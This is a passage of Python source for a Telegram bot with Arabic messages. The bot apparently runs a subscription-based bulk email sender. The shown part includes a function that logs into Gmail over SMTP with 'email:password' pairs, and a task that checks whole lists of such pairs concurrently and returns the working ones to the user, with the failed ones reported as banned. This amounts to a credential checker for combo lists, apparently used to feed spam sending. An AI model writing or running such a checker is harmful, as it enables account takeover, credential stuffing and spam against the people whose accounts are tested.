        f"فشل: {data.get('failed', 0)}\n"
        f"المتبقي: {data.get('remaining', 0)}\n"
    )

    if data.get('failed_accounts'):
        status_text += "\nالإيميلات المحظورة:\n" + "\n".join(
            [acc.split(":")[0] for acc in set(data['failed_accounts'])]
        )

    try:
        kb = build_status_keyboard(data, chat_id) if data.get('sending') else back_keyboard(chat_id)
        await bot.edit_message_text(status_text, chat_id, status_id, reply_markup=kb)
    except Exception as e:
        print(f"Failed to update status message: {e}")
        try:
            new_msg = await bot.send_message(chat_id, status_text, reply_markup=build_status_keyboard(data, chat_id) if data.get('sending') else back_keyboard(chat_id))
            data['status_message_id'] = new_msg.message_id
            save_user_data()
        except Exception as e2:
            print(f"Failed to send fallback status message: {e2}")


async def can_send_email(email, password):
    try:
        smtp_server = "smtp.gmail.com"
        smtp_port = 587
        smtp = SMTP(hostname=smtp_server, port=smtp_port)

        await smtp.connect()

        try:
            await smtp.starttls()
        except Exception as e:
            if "already using tls" not in str(e).lower():
                raise

        await smtp.login(email, password)

        msg = MIMEText("This is a test email.", "plain")
        msg["From"] = email
        msg["To"] = email
        msg["Subject"] = "Test Email"

        await smtp.send_message(msg)
        await smtp.quit()
        return True
    except Exception as e:
        try:
            await smtp.quit()
        except:
            pass
        return False


async def check_accounts_task(chat_id, accounts):
    valid_emails = []
    invalid_emails = []

    async def check_account(acc):
        if ":" not in acc:
            return None, None
        email, password = acc.split(":", 1)
        if await can_send_email(email.strip(), password.strip()):
            return acc, True
        else:
            return acc, False

    results = await asyncio.gather(*(check_account(acc) for acc in accounts))

    for acc, is_valid in results:
        if acc is None:
            continue
        if is_valid:
            valid_emails.append(acc)
        else:
            invalid_emails.append(acc)

    result = ""
    if valid_emails:
        result += "الإيميلات الصالحة:\n" + "\n".join(valid_emails) + "\n\n"
    else:
        result += "لا توجد إيميلات صالحة.\n\n"
    if invalid_emails:
        result += "الإيميلات غير الصالحة:\n" + "\n".join(invalid_emails)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("رجوع", callback_data="back"))
    await bot.send_message(chat_id, result, reply_markup=markup)

async def expiry_checker_loop():
    while True:
        try:
            now = now_ts()
            removed = []
            for k, v in list(allowed_users.items()):
                expiry = v.get('expiry', 0)
                if expiry <= now:
                    removed.append(k)
                    del allowed_users[k]
            if removed:
                save_allowed()
                for admin_id in ADMIN_IDS:
                    try:
                        await bot.send_message(admin_id, f"تمت إزالة مُستخدمين انتهت صلاحية اشتاركهم:\n" + "\n".join(removed))
                    except Exception:
                        pass
        except Exception as e:
            print(f"expiry checker error: {e}")
        await asyncio.sleep(60)
loop = asyncio.new_event_loop()

if __name__ == "__main__":
    load_all_data()
    asyncio.set_event_loop(loop)
    loop.create_task(expiry_checker_loop())
    asyncio.run(bot.infinity_polling())
